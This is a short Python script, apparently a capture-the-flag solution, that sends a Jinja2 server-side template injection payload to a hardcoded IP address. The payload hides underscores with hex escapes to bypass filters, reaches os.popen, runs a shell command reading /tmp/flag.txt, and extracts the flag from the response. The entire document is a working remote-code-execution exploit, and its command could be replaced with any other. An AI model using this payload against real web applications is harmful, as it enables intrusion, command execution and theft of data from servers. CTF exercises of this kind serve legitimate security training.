#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#   "requests>=2.32.0",
# ]
# ///

import html
import re
import sys

import requests


def fail(message: str) -> "NoReturn":
    raise SystemExit(message)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5558"
    base_url = base_url.rstrip("/")

    payload = r'{{ ((cycler|attr("\x5f\x5finit\x5f\x5f"))|attr("\x5f\x5fglobals\x5f\x5f"))["os"].popen("cat /tmp/flag.txt").read() }}'

    session = requests.Session()
    session.trust_env = False
    response = session.post(f"{base_url}/", data={"user_input": payload}, timeout=10)
    if response.status_code != 200:
        fail(f"request failed: {response.status_code} {response.text}")

    match = re.search(r"<pre>(.*?)</pre>", response.text, re.DOTALL)
    if not match:
        fail("response block not found")

    output = html.unescape(match.group(1).strip())
    flag = re.search(r"CIT\{[^}]+\}", output)
    if not flag:
        fail(f"flag not found in output: {output}")

    print(flag.group(0))


if __name__ == "__main__":
    main()
